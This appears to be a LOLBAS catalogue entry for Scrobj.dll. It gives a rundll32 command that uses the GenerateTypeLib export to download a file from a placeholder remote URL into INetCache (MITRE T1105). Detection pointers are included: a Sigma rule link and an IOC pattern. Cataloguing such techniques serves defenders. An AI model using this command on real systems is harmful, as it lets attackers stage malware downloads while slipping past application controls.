---
Acknowledgement:
- Person: Era
Author: Eral4m
Commands:
- Category: Download
  Command: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
  Description: Once executed, scrobj.dll attempts to load a file from the URL and
    saves it to INetCache.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from remote location.
Created: 2021-01-07
Description: Windows Script Component Runtime
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- IOC: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://')
    on the command line
Full_Path:
- Path: c:\windows\system32\scrobj.dll
- Path: c:\windows\syswow64\scrobj.dll
Name: Scrobj.dll
Resources:
- Link: https://twitter.com/eral4m/status/1479106975967240209
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/oslibraries
---

# Scrobj.dll

Windows Script Component Runtime

# Path(s)

- `c:\windows\system32\scrobj.dll`
- `c:\windows\syswow64\scrobj.dll`

# Download Commands

Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.

```batch
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
```

- **Usecase:** Download file from remote location.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://twitter.com/eral4m/status/1479106975967240209
# Acknowledgements

- Eral4m (Authored, 2021-01-07)
- Era